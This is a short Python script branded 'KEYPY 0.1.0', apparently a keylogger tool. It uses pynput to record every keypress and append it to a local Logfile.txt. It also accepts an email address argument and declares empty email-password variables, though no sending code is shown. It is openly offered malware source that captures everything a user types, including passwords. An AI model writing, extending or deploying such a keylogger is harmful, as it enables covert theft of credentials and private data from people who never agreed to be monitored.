#!/usr/bin/python3
# -*- coding: utf-8 -*-

"""
    ██╗░░██╗███████╗██╗░░░██╗██████╗░██╗░░░██╗
    ██║░██╔╝██╔════╝╚██╗░██╔╝██╔══██╗╚██╗░██╔╝
    █████═╝░█████╗░░░╚████╔╝░██████╔╝░╚████╔╝░
    ██╔═██╗░██╔══╝░░░░╚██╔╝░░██╔═══╝░░░╚██╔╝░░
    ██║░╚██╗███████╗░░░██║░░░██║░░░░░░░░██║░░░
    ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░ 0.1.0
"""

# Modules

from pynput.keyboard import Key, Listener
from rich.console import Console
import sys
import argparse
import os

# Logic

console = Console()
youremail = ""
youremailpass = ""
t = ""
s = 0


def write_keyboard(key):
    global t
    t += str(key).replace("'", "")
    if len(t) >= count:
        f = open("Logfile.txt", "a")
        f.write(t.replace("'", ""))
        f.close()
        t = ""


if __name__ == "__main__":

    # Parse

    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--count",
        help="Number of symbols per file",
        type=int,
        dest="count",
        required=True,
    )
    parser.add_argument(
        "--email", help="Your email address", type=str, dest="email", required=True
    )
    args = parser.parse_args()
    email = args.email
    count = args.count

    try:
        f = open("Logfile.txt", "a")
        f.close()
    except:
        f = open("Logfile.txt", "w")
        f.close()

    with Listener(on_press=write_keyboard) as listener:
        listener.join()
